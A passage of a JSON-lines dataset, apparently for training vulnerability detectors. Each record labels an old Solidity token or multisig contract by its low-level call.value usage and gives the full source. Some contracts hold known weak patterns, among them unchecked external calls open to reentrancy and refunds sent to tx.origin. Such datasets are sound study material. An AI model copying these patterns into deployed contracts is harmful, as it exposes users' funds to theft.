return true; } modifier onlyMultiAsset() { if (msg.sender == address(multiAsset)) { _; } } function totalSupply() constant returns(uint) { return multiAsset.totalSupply(symbol); } function balanceOf(address _owner) constant returns(uint) { return multiAsset.balanceOf(_owner, symbol); } function allowance(address _from, address _spender) constant returns(uint) { return multiAsset.allowance(_from, _spender, symbol); } function transfer(address _to, uint _value) returns(bool) { return transferWithReference(_to, _value, \"\"); } function transferWithReference(address _to, uint _value, string _reference) returns(bool) { if (!multiAsset.proxyTransferWithReference(_to, _value, symbol, _reference)) { return false; } return true; } function transferToICAP(bytes32 _icap, uint _value) returns(bool) { return transferToICAPWithReference(_icap, _value, \"\"); } function transferToICAPWithReference(bytes32 _icap, uint _value, string _reference) returns(bool) { if (!multiAsset.proxyTransferToICAPWithReference(_icap, _value, _reference)) { return false; } return true; } function transferFrom(address _from, address _to, uint _value) returns(bool) { return transferFromWithReference(_from, _to, _value, \"\"); } function transferFromWithReference(address _from, address _to, uint _value, string _reference) returns(bool) { if (!multiAsset.proxyTransferFromWithReference(_from, _to, _value, symbol, _reference)) { return false; } return true; } function transferFromToICAP(address _from, bytes32 _icap, uint _value) returns(bool) { return transferFromToICAPWithReference(_from, _icap, _value, \"\"); } function transferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference) returns(bool) { if (!multiAsset.proxyTransferFromToICAPWithReference(_from, _icap, _value, _reference)) { return false; } return true; } function approve(address _spender, uint _value) returns(bool) { if (!multiAsset.proxyApprove(_spender, _value, symbol)) { return false; } return true; } function setCosignerAddress(address _cosigner) returns(bool) { if (!multiAsset.proxySetCosignerAddress(_cosigner, symbol)) { return false; } return true; } function emitTransfer(address _from, address _to, uint _value) onlyMultiAsset() { Transfer(_from, _to, _value); } function emitApprove(address _from, address _spender, uint _value) onlyMultiAsset() { Approve(_from, _spender, _value); } function sendToOwner() returns(bool) { return multiAsset.transfer(multiAsset.owner(symbol), balanceOf(address(this)), symbol); } } contract Ambi { function getNodeAddress(bytes32) constant returns(address); function addNode(bytes32, address) external returns(bool); function hasRelation(bytes32, bytes32, address) constant returns(bool); } contract AmbiEnabled { Ambi ambiC; bytes32 public name; modifier checkAccess(bytes32 _role) { if(address(ambiC) != 0x0 && ambiC.hasRelation(name, _role, msg.sender)){ _; } } function getAddress(bytes32 _name) constant returns (address) { return ambiC.getNodeAddress(_name); } function setAmbiAddress(address _ambi, bytes32 _name) returns (bool){ if(address(ambiC) != 0x0){ return false; } Ambi ambiContract = Ambi(_ambi); if(ambiContract.getNodeAddress(_name)!=address(this)) { bool isNode = ambiContract.addNode(_name, address(this)); if (!isNode){ return false; } } name = _name; ambiC = ambiContract; return true; } function remove() checkAccess(\"owner\") { suicide(msg.sender); } } contract OpenDollar is Asset, AmbiEnabled { uint public txGasPriceLimit = 21000000000; uint public refundGas = 40000; uint public transferCallGas = 21000; uint public transferWithReferenceCallGas = 21000; uint public transferFromCallGas = 21000; uint public transferFromWithReferenceCallGas = 21000; uint public transferToICAPCallGas = 21000; uint public transferToICAPWithReferenceCallGas = 21000; uint public transferFromToICAPCallGas = 21000; uint public transferFromToICAPWithReferenceCallGas = 21000; uint public approveCallGas = 21000; uint public forwardCallGas = 21000; uint public setCosignerCallGas = 21000; EtherTreasuryInterface public treasury; mapping(uint32 => address) public allowedForwards; function updateRefundGas() checkAccess(\"setup\") returns(uint) { uint startGas = msg.gas; uint refund = (startGas - msg.gas + refundGas) * tx.gasprice; if (tx.gasprice > txGasPriceLimit) { return 0; } if (!_refund(1)) { return 0; } refundGas = startGas - msg.gas; return refundGas; } function setOperationsCallGas ( uint _transfer, uint _transferFrom, uint _transferToICAP, uint _transferFromToICAP, uint _transferWithReference, uint _transferFromWithReference, uint _transferToICAPWithReference, uint _transferFromToICAPWithReference, uint _approve, uint _forward, uint _setCosigner ) checkAccess(\"setup\") returns(bool) { transferCallGas = _transfer; transferFromCallGas = _transferFrom; transferToICAPCallGas = _transferToICAP; transferFromToICAPCallGas = _transferFromToICAP; transferWithReferenceCallGas = _transferWithReference; transferFromWithReferenceCallGas = _transferFromWithReference; transferToICAPWithReferenceCallGas = _transferToICAPWithReference; transferFromToICAPWithReferenceCallGas = _transferFromToICAPWithReference; approveCallGas = _approve; forwardCallGas = _forward; setCosignerCallGas = _setCosigner; return true; } function setupTreasury(address _treasury, uint _txGasPriceLimit) checkAccess(\"admin\") returns(bool) { if (_txGasPriceLimit == 0) { return false; } treasury = EtherTreasuryInterface(_treasury); txGasPriceLimit = _txGasPriceLimit; if (msg.value > 0 && !address(treasury).send(msg.value)) { throw; } return true; } function setForward(bytes4 _msgSig, address _forward) checkAccess(\"admin\") returns(bool) { allowedForwards[uint32(_msgSig)] = _forward; return true; } function _stringGas(string _string) constant internal returns(uint) { return bytes(_string).length * 75; } function _applyRefund(uint _startGas) internal returns(bool) { if (tx.gasprice > txGasPriceLimit) { return false; } uint refund = (_startGas - msg.gas + refundGas) * tx.gasprice; return _refund(refund); } function _refund(uint _value) internal returns(bool) { return treasury.withdraw(tx.origin, _value); } function _transfer(address _to, uint _value) internal returns(bool, bool) { uint startGas = msg.gas + transferCallGas; if (!multiAsset.proxyTransferWithReference(_to, _value, symbol, \"\")) { return (false, false); } return (true, _applyRefund(startGas)); } function _transferFrom(address _from, address _to, uint _value) internal returns(bool, bool) { uint startGas = msg.gas + transferFromCallGas; if (!multiAsset.proxyTransferFromWithReference(_from, _to, _value, symbol, \"\")) { return (false, false); } return (true, _applyRefund(startGas)); } function _transferToICAP(bytes32 _icap, uint _value) internal returns(bool, bool) { uint startGas = msg.gas + transferToICAPCallGas; if (!multiAsset.proxyTransferToICAPWithReference(_icap, _value, \"\")) { return (false, false); } return (true, _applyRefund(startGas)); } function _transferFromToICAP(address _from, bytes32 _icap, uint _value) internal returns(bool, bool) { uint startGas = msg.gas + transferFromToICAPCallGas; if (!multiAsset.proxyTransferFromToICAPWithReference(_from, _icap, _value, \"\")) { return (false, false); } return (true, _applyRefund(startGas)); } function _transferWithReference(address _to, uint _value, string _reference) internal returns(bool, bool) { uint startGas = msg.gas + transferWithReferenceCallGas + _stringGas(_reference); if (!multiAsset.proxyTransferWithReference(_to, _value, symbol, _reference)) { return (false, false); } return (true, _applyRefund(startGas)); } function _transferFromWithReference(address _from, address _to, uint _value, string _reference) internal returns(bool, bool) { uint startGas = msg.gas + transferFromWithReferenceCallGas + _stringGas(_reference); if (!multiAsset.proxyTransferFromWithReference(_from, _to, _value, symbol, _reference)) { return (false, false); } return (true, _applyRefund(startGas)); } function _transferToICAPWithReference(bytes32 _icap, uint _value, string _reference) internal returns(bool, bool) { uint startGas = msg.gas + transferToICAPWithReferenceCallGas + _stringGas(_reference); if (!multiAsset.proxyTransferToICAPWithReference(_icap, _value, _reference)) { return (false, false); } return (true, _applyRefund(startGas)); } function _transferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference) internal returns(bool, bool) { uint startGas = msg.gas + transferFromToICAPWithReferenceCallGas + _stringGas(_reference); if (!multiAsset.proxyTransferFromToICAPWithReference(_from, _icap, _value, _reference)) { return (false, false); } return (true, _applyRefund(startGas)); } function _approve(address _spender, uint _value) internal returns(bool, bool) { uint startGas = msg.gas + approveCallGas; if (!multiAsset.proxyApprove(_spender, _value, symbol)) { return (false, false); } return (true, _applyRefund(startGas)); } function _setCosignerAddress(address _cosigner) internal returns(bool, bool) { uint startGas = msg.gas + setCosignerCallGas; if (!multiAsset.proxySetCosignerAddress(_cosigner, symbol)) { return (false, false); } return (true, _applyRefund(startGas)); } function transfer(address _to, uint _value) returns(bool) { bool success; (success,) = _transfer(_to, _value); return success; } function transferFrom(address _from, address _to, uint _value) returns(bool) { bool success; (success,) = _transferFrom(_from, _to, _value); return success; } function transferToICAP(bytes32 _icap, uint _value) returns(bool) { bool success; (success,) = _transferToICAP(_icap, _value); return success; } function transferFromToICAP(address _from, bytes32 _icap, uint _value) returns(bool) { bool success; (success,) = _transferFromToICAP(_from, _icap, _value); return success; } function transferWithReference(address _to, uint _value, string _reference) returns(bool) { bool success; (success,) = _transferWithReference(_to, _value, _reference); return success; } function transferFromWithReference(address _from, address _to, uint _value, string _reference) returns(bool) { bool success; (success,) = _transferFromWithReference(_from, _to, _value, _reference); return success; } function transferToICAPWithReference(bytes32 _icap, uint _value, string _reference) returns(bool) { bool success; (success,) = _transferToICAPWithReference(_icap, _value, _reference); return success; } function transferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference) returns(bool) { bool success; (success,) = _transferFromToICAPWithReference(_from, _icap, _value, _reference); return success; } function approve(address _spender, uint _value) returns(bool) { bool success; (success,) = _approve(_spender, _value); return success; } function setCosignerAddress(address _cosigner) returns(bool) { bool success; (success,) = _setCosignerAddress(_cosigner); return success; } function checkTransfer(address _to, uint _value) constant returns(bool, bool) { return _transfer(_to, _value); } function checkTransferFrom(address _from, address _to, uint _value) constant returns(bool, bool) { return _transferFrom(_from, _to, _value); } function checkTransferToICAP(bytes32 _icap, uint _value) constant returns(bool, bool) { return _transferToICAP(_icap, _value); } function checkTransferFromToICAP(address _from, bytes32 _icap, uint _value) constant returns(bool, bool) { return _transferFromToICAP(_from, _icap, _value); } function checkTransferWithReference(address _to, uint _value, string _reference) constant returns(bool, bool) { return _transferWithReference(_to, _value, _reference); } function checkTransferFromWithReference(address _from, address _to, uint _value, string _reference) constant returns(bool, bool) { return _transferFromWithReference(_from, _to, _value, _reference); } function checkTransferToICAPWithReference(bytes32 _icap, uint _value, string _reference) constant returns(bool, bool) { return _transferToICAPWithReference(_icap, _value, _reference); } function checkTransferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference) constant returns(bool, bool) { return _transferFromToICAPWithReference(_from, _icap, _value, _reference); } function checkApprove(address _spender, uint _value) constant returns(bool, bool) { return _approve(_spender, _value); } function checkSetCosignerAddress(address _cosigner) constant returns(bool, bool) { return _setCosignerAddress(_cosigner); } function _forward(address _to, bytes _data) internal returns(bool) { uint startGas = msg.gas + forwardCallGas + (_data.length * 50); if (_to == 0x0) { return false; } _to.call.value(msg.value)(_data); return _applyRefund(startGas); } function () returns(bool) { return _forward(allowedForwards[uint32(msg.sig)], msg.data); } } "}
{"sol name": "33450.sol", "label": 0, "first path": "function executeTransaction(bytes32 TransHash) public notExecuted(TransHash){ if (isConfirmed(TransHash)) { Transactions[TransHash].executed = true; require(Transactions[TransHash].destination.call.value(Transactions[TransHash].value)(Transactions[TransHash].data)); Execution(TransHash); function confirmTransaction(bytes32 TransHash) public onlyOwner(){ addConfirmation(TransHash); executeTransaction(TransHash); ", "second path": "function executeTransaction(bytes32 TransHash) public notExecuted(TransHash){ if (isConfirmed(TransHash)) { Transactions[TransHash].executed = true; require(Transactions[TransHash].destination.call.value(Transactions[TransHash].value)(Transactions[TransHash].data)); Execution(TransHash); function confirmTransaction(bytes32 TransHash) public onlyOwner(){ addConfirmation(TransHash); executeTransaction(TransHash); ", "third path": "function executeTransaction(bytes32 TransHash) public notExecuted(TransHash){ if (isConfirmed(TransHash)) { Transactions[TransHash].executed = true; require(Transactions[TransHash].destination.call.value(Transactions[TransHash].value)(Transactions[TransHash].data)); Execution(TransHash); function confirmTransaction(bytes32 TransHash) public onlyOwner(){ addConfirmation(TransHash); executeTransaction(TransHash); ", "long path": "pragma solidity ^0.4.15; contract MultiOwner { event OwnerAdded(address newOwner); event OwnerRemoved(address oldOwner); event RequirementChanged(uint256 newRequirement); uint256 public ownerRequired; mapping (address => bool) public isOwner; mapping (address => bool) public RequireDispose; address[] owners; function MultiOwner(address[] _owners, uint256 _required) public { ownerRequired = _required; isOwner[msg.sender] = true; owners.push(msg.sender); for (uint256 i = 0; i < _owners.length; ++i){ require(!isOwner[_owners[i]]); isOwner[_owners[i]] = true; owners.push(_owners[i]); } } modifier onlyOwner { require(isOwner[msg.sender]); _; } modifier ownerDoesNotExist(address owner) { require(!isOwner[owner]); _; } modifier ownerExists(address owner) { require(isOwner[owner]); _; } function addOwner(address owner) onlyOwner ownerDoesNotExist(owner) external{ isOwner[owner] = true; owners.push(owner); OwnerAdded(owner); } function numberOwners() public constant returns (uint256 NumberOwners){ NumberOwners = owners.length; } function removeOwner(address owner) onlyOwner ownerExists(owner) external{ require(owners.length > 2); isOwner[owner] = false; RequireDispose[owner] = false; for (uint256 i=0; i<owners.length - 1; i++){ if (owners[i] == owner) { owners[i] = owners[owners.length - 1]; break; } } owners.length -= 1; OwnerRemoved(owner); } function changeRequirement(uint _newRequired) onlyOwner external { require(_newRequired >= owners.length); ownerRequired = _newRequired; RequirementChanged(_newRequired); } function ConfirmDispose() onlyOwner() returns (bool){ uint count = 0; for (uint i=0; i<owners.length - 1; i++) if (RequireDispose[owners[i]]) count += 1; if (count == ownerRequired) return true; } function kill() onlyOwner(){ RequireDispose[msg.sender] = true; if(ConfirmDispose()){ selfdestruct(msg.sender); } } } contract VVToken is MultiOwner{ event SubmitTransaction(bytes32 transactionHash); event Confirmation(address sender, bytes32 transactionHash); event Execution(bytes32 transactionHash); event FrozenFunds(address target, bool frozen); event Transfer(address indexed from, address indexed to, uint256 value); event FeePaid(address indexed from, address indexed to, uint256 value); event VoidAccount(address indexed from, address indexed to, uint256 value); event Bonus(uint256 value); event Burn(uint256 value); string public name = \"VV Coin\"; string public symbol = \"VVI\"; uint8 public decimals = 8; uint256 public totalSupply = 3000000000 * 10 ** uint256(decimals); uint256 public EthPerToken = 300000; uint256 public ChargeFee = 2; mapping(address => uint256) public balanceOf; mapping(address => bool) public frozenAccount; mapping (bytes32 => mapping (address => bool)) public Confirmations; mapping (bytes32 => Transaction) public Transactions; struct Transaction { address destination; uint value; bytes data; bool executed; } modifier notNull(address destination) { require (destination != 0x0); _; } modifier confirmed(bytes32 transactionHash) { require (Confirmations[transactionHash][msg.sender]); _; } modifier notConfirmed(bytes32 transactionHash) { require (!Confirmations[transactionHash][msg.sender]); _; } modifier notExecuted(bytes32 TransHash) { require (!Transactions[TransHash].executed); _; } function VVToken(address[] _owners, uint256 _required) MultiOwner(_owners, _required) public { balanceOf[msg.sender] = totalSupply; } function _transfer(address _from, address _to, uint256 _value) internal { require (_to != 0x0); require (balanceOf[_from] >= _value); require (balanceOf[_to] + _value >= balanceOf[_to]); require(!frozenAccount[_from]); uint256 previousBalances = balanceOf[_from] + balanceOf[_to]; balanceOf[_from] -= _value; balanceOf[_to] += _value; Transfer(_from, _to, _value); assert(balanceOf[_from] + balanceOf[_to] == previousBalances); } function _collect_fee(address _from, address _to, uint256 _value) internal { require (_to != 0x0); require (balanceOf[_from] >= _value); require (balanceOf[_to] + _value >= balanceOf[_to]); require(!frozenAccount[_from]); uint256 previousBalances = balanceOf[_from] + balanceOf[_to]; balanceOf[_from] -= _value; balanceOf[_to] += _value; FeePaid(_from, _to, _value); assert(balanceOf[_from] + balanceOf[_to] == previousBalances); } function transfer(address _to, uint256 _value) public { _transfer(msg.sender, _to, _value); } function transferFrom(address _from, address _to, uint256 _value, bool _fee) onlyOwner public returns (bool success) { uint256 charge = 0 ; uint256 t_value = _value; if(_fee){ charge = _value * ChargeFee / 100; }else{ charge = _value - (_value / (ChargeFee + 100) * 100); } t_value = _value - charge; require(t_value + charge == _value); _transfer(_from, _to, t_value); _collect_fee(_from, this, charge); return true; } function setPrices(uint256 newValue) onlyOwner public { EthPerToken = newValue; } function setFee(uint256 newValue) onlyOwner public { ChargeFee = newValue; } function freezeAccount(address target, bool freeze) onlyOwner public { frozenAccount[target] = freeze; FrozenFunds(target, freeze); } function() payable { require(msg.value > 0); uint amount = msg.value * 10 ** uint256(decimals) * EthPerToken / 1 ether; _transfer(this, msg.sender, amount); } function remainBalanced() public constant returns (uint256){ return balanceOf[this]; } function execute(address _to, uint _value, bytes _data) notNull(_to) onlyOwner external returns (bytes32 _r) { _r = addTransaction(_to, _value, _data); confirmTransaction(_r); } function addTransaction(address destination, uint value, bytes data) private notNull(destination) returns (bytes32 TransHash){ TransHash = sha3(destination, value, data); if (Transactions[TransHash].destination == 0) { Transactions[TransHash] = Transaction({ destination: destination, value: value, data: data, executed: false }); SubmitTransaction(TransHash); } } function addConfirmation(bytes32 TransHash) private onlyOwner notConfirmed(TransHash){ Confirmations[TransHash][msg.sender] = true; Confirmation(msg.sender, TransHash); } function isConfirmed(bytes32 TransHash) public constant returns (bool){ uint count = 0; for (uint i=0; i<owners.length; i++) if (Confirmations[TransHash][owners[i]]) count += 1; if (count == ownerRequired) return true; } function confirmationCount(bytes32 TransHash) external constant returns (uint count){ for (uint i=0; i<owners.length; i++) if (Confirmations[TransHash][owners[i]]) count += 1; } function confirmTransaction(bytes32 TransHash) public onlyOwner(){ addConfirmation(TransHash); executeTransaction(TransHash); } function executeTransaction(bytes32 TransHash) public notExecuted(TransHash){ if (isConfirmed(TransHash)) { Transactions[TransHash].executed = true; require(Transactions[TransHash].destination.call.value(Transactions[TransHash].value)(Transactions[TransHash].data)); Execution(TransHash); } } function AccountVoid(address _from) onlyOwner public{ require (balanceOf[_from] > 0); uint256 CurrentBalances = balanceOf[_from]; uint256 previousBalances = balanceOf[_from] + balanceOf[msg.sender]; balanceOf[_from] -= CurrentBalances; balanceOf[msg.sender] += CurrentBalances; VoidAccount(_from, msg.sender, CurrentBalances); assert(balanceOf[_from] + balanceOf[msg.sender] == previousBalances); } function burn(uint amount) onlyOwner{ uint BurnValue = amount * 10 ** uint256(decimals); require(balanceOf[this] >= BurnValue); balanceOf[this] -= BurnValue; totalSupply -= BurnValue; Burn(BurnValue); } function bonus(uint amount) onlyOwner{ uint BonusValue = amount * 10 ** uint256(decimals); require(balanceOf[this] + BonusValue > balanceOf[this]); balanceOf[this] += BonusValue; totalSupply += BonusValue; Bonus(BonusValue); } } "}
{"sol name": "14945.sol", "label": 1, "first path": "function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.approve(_spender, _value); require(_spender.call.value(msg.value)(_data)); return true; ", "second path": "function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.approve(_spender, _value); require(_spender.call.value(msg.value)(_data)); return true; ", "third path": "function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.approve(_spender, _value); require(_spender.call.value(msg.value)(_data)); return true; ", "long path": "pragma solidity ^0.4.21; contract ERC20Basic { function totalSupply() public view returns (uint256); function balanceOf(address who) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public view returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval(address indexed owner, address indexed spender, uint256 value); } library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256 c) { if (a == 0) { return 0; } c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256 c) { c = a + b; assert(c >= a); return c; } } contract BasicToken is ERC20Basic { using SafeMath for uint256; mapping(address => uint256) balances; uint256 totalSupply_; function totalSupply() public view returns (uint256) { return totalSupply_; } function transfer(address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[msg.sender]); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); emit Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _owner) public view returns (uint256) { return balances[_owner]; } } contract StandardToken is ERC20, BasicToken { mapping (address => mapping (address => uint256)) internal allowed; function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); emit Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; emit Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) public view returns (uint256) { return allowed[_owner][_spender]; } function increaseApproval(address _spender, uint _addedValue) public returns (bool) { allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue); emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) { uint oldValue = allowed[msg.sender][_spender]; if (_subtractedValue > oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue); } emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } } contract StudToken is StandardToken { function() public { revert(); } string public constant name = 'Stud Coin'; string public constant symbol = 'STUD'; uint8 public constant decimals = 3; string public constant version = 'S1.0'; function StudToken(uint256 _initialAmount) public { balances[msg.sender] = _initialAmount; totalSupply_ = _initialAmount; } function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.approve(_spender, _value); require(_spender.call.value(msg.value)(_data)); return true; } } "}
{"sol name": "4591.sol", "label": 0, "first path": "function finishDistribution() onlyOwner canDistr public returns (bool) { crowdsaleClosed = true; uint256 amount = tokenReward.sub(amountRaisedIsc); balances[beneficiary] = balances[beneficiary].add(amount); emit Transfer(address(0), beneficiary, amount); require(msg.sender.call.value(amountRaised)()); return true; ", "second path": "function finishDistribution() onlyOwner canDistr public returns (bool) { crowdsaleClosed = true; uint256 amount = tokenReward.sub(amountRaisedIsc); balances[beneficiary] = balances[beneficiary].add(amount); emit Transfer(address(0), beneficiary, amount); require(msg.sender.call.value(amountRaised)()); return true; ", "third path": "function finishDistribution() onlyOwner canDistr public returns (bool) { crowdsaleClosed = true; uint256 amount = tokenReward.sub(amountRaisedIsc); balances[beneficiary] = balances[beneficiary].add(amount); emit Transfer(address(0), beneficiary, amount); require(msg.sender.call.value(amountRaised)()); return true; ", "long path": "pragma solidity ^0.4.18; contract ERC20Basic { function totalSupply() public view returns (uint256); function balanceOf(address who) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract BasicToken is ERC20Basic { using SafeMath for uint256; mapping(address => uint256) balances; uint256 totalSupply_; function totalSupply() public view returns (uint256) { return totalSupply_; } function transfer(address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[msg.sender]); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _owner) public view returns (uint256 balance) { return balances[_owner]; } } contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public view returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval(address indexed owner, address indexed spender, uint256 value); } contract StandardToken is ERC20, BasicToken { mapping (address => mapping (address => uint256)) internal allowed; function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) public view returns (uint256) { return allowed[_owner][_spender]; } function increaseApproval(address _spender, uint _addedValue) public returns (bool) { allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue); Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) { uint oldValue = allowed[msg.sender][_spender]; if (_subtractedValue > oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue); } Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } } contract IChain is StandardToken { string public name = 'IChain'; string public symbol = 'ISC'; uint8 public decimals = 18; uint public INITIAL_SUPPLY = 210000000 ether; address public beneficiary; address public owner; uint256 public fundingGoal ; uint256 public amountRaised ; uint256 public amountRaisedIsc ; uint256 public price; uint256 public totalDistributed = 157500000 ether; uint256 public totalRemaining; uint256 public tokenReward = INITIAL_SUPPLY.sub(totalDistributed); bool public fundingGoalReached = true; bool public crowdsaleClosed = true; event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); event Distr(address indexed to, uint256 amount); function IChain(address ifSuccessfulSendTo, uint fundingGoalInEthers, uint _price ) public { totalSupply_ = INITIAL_SUPPLY; beneficiary = ifSuccessfulSendTo; fundingGoal = fundingGoalInEthers * 1 ether; price = _price; owner = msg.sender; balances[msg.sender] = totalDistributed; } modifier canDistr() { require(!crowdsaleClosed); _; } modifier onlyOwner() { require(msg.sender == owner); _; } function () external payable { require(!crowdsaleClosed); require(!fundingGoalReached); getTokens(); } function finishDistribution() onlyOwner canDistr public returns (bool) { crowdsaleClosed = true; uint256 amount = tokenReward.sub(amountRaisedIsc); balances[beneficiary] = balances[beneficiary].add(amount); emit Transfer(address(0), beneficiary, amount); require(msg.sender.call.value(amountRaised)()); return true; } function StartDistribution() onlyOwner   public returns (bool) { if(amountRaised == 0){ crowdsaleClosed = false; fundingGoalReached = false; return true; }else{ return; } } function getTokens() canDistr payable { if (amountRaised >= fundingGoal) { fundingGoalReached = true; return; } address investor = msg.sender; uint amount = msg.value; distr(investor,amount); } function withdraw() onlyOwner public { uint256 etherBalance = address(this).balance; owner.transfer(etherBalance); } function distr(address _to, uint256 _amount) canDistr private returns (bool) { amountRaised += _amount; _amount=_amount.mul(price); amountRaisedIsc += _amount; balances[_to] = balances[_to].add(_amount); emit Distr(_to, _amount); emit Transfer(address(0), _to, _amount); return true; } } "}
{"sol name": "40092.sol", "label": 0, "first path": "function withdrawPayments() external  returns (bool success) { uint256 payment = payments[msg.sender]; payments[msg.sender] = 0; totalBalance -= payment; if (!msg.sender.call.value(payment)()) { throw; } success = true; ", "second path": "function withdrawPayments() external  returns (bool success) { uint256 payment = payments[msg.sender]; payments[msg.sender] = 0; totalBalance -= payment; if (!msg.sender.call.value(payment)()) { throw; } success = true; ", "third path": "function withdrawPayments() external  returns (bool success) { uint256 payment = payments[msg.sender]; payments[msg.sender] = 0; totalBalance -= payment; if (!msg.sender.call.value(payment)()) { throw; } success = true; ", "long path": "pragma solidity ^0.4.2; contract OwnedI { event LogOwnerChanged(address indexed previousOwner, address indexed newOwner); function getOwner() constant returns (address); function setOwner(address newOwner) returns (bool success); } contract Owned is OwnedI { address private owner; function Owned() { owner = msg.sender; } modifier fromOwner { if (msg.sender != owner) { throw; } _; } function getOwner() constant returns (address) { return owner; } function setOwner(address newOwner) fromOwner returns (bool success) { if (newOwner == 0) { throw; } if (owner != newOwner) { LogOwnerChanged(owner, newOwner); owner = newOwner; } success = true; } } contract PullPaymentCapable { uint256 private totalBalance; mapping(address => uint256) private payments; event LogPaymentReceived(address indexed dest, uint256 amount); function PullPaymentCapable() { if (0 < this.balance) { asyncSend(msg.sender, this.balance); } } function asyncSend(address dest, uint256 amount) internal { if (amount > 0) { totalBalance += amount; payments[dest] += amount; LogPaymentReceived(dest, amount); } } function getTotalBalance() constant returns (uint256) { return totalBalance; } function getPaymentOf(address beneficiary) constant returns (uint256) { return payments[beneficiary]; } function withdrawPayments() external  returns (bool success) { uint256 payment = payments[msg.sender]; payments[msg.sender] = 0; totalBalance -= payment; if (!msg.sender.call.value(payment)()) { throw; } success = true; } function fixBalance() returns (bool success); function fixBalanceInternal(address dest) internal returns (bool success) { if (totalBalance < this.balance) { uint256 amount = this.balance - totalBalance; payments[dest] += amount; LogPaymentReceived(dest, amount); } return true; } } contract WithBeneficiary is Owned { address private beneficiary; event LogBeneficiarySet(address indexed previousBeneficiary, address indexed newBeneficiary); function WithBeneficiary(address _beneficiary) payable { if (_beneficiary == 0) { throw; } beneficiary = _beneficiary; if (msg.value > 0) { asyncSend(beneficiary, msg.value); } } function asyncSend(address dest, uint amount) internal; function getBeneficiary() constant returns (address) { return beneficiary; } function setBeneficiary(address newBeneficiary) fromOwner returns (bool success) { if (newBeneficiary == 0) { throw; } if (beneficiary != newBeneficiary) { LogBeneficiarySet(beneficiary, newBeneficiary); beneficiary = newBeneficiary; } success = true; } function () payable { asyncSend(beneficiary, msg.value); } } contract CertificationCentreI { event LogCertificationDbRegistered(address indexed db); event LogCertificationDbUnRegistered(address indexed db); function getCertificationDbCount() constant returns (uint); function getCertificationDbStatus(address db) constant returns (bool valid, uint256 index); function getCertificationDbAtIndex(uint256 index) constant returns (address db); function registerCertificationDb(address db) returns (bool success); function unRegisterCertificationDb(address db) returns (bool success); } contract CertificationCentre is CertificationCentreI, WithBeneficiary, PullPaymentCapable { struct CertificationDbStruct { bool valid; uint256 index; } mapping (address => CertificationDbStruct) private certificationDbStatuses; address[] private certificationDbs; function CertificationCentre(address beneficiary) WithBeneficiary(beneficiary) { if (msg.value > 0) { throw; } } function getCertificationDbCount() constant returns (uint256) { return certificationDbs.length; } function getCertificationDbStatus(address db) constant returns (bool valid, uint256 index) { CertificationDbStruct status = certificationDbStatuses[db]; return (status.valid, status.index); } function getCertificationDbAtIndex(uint256 index) 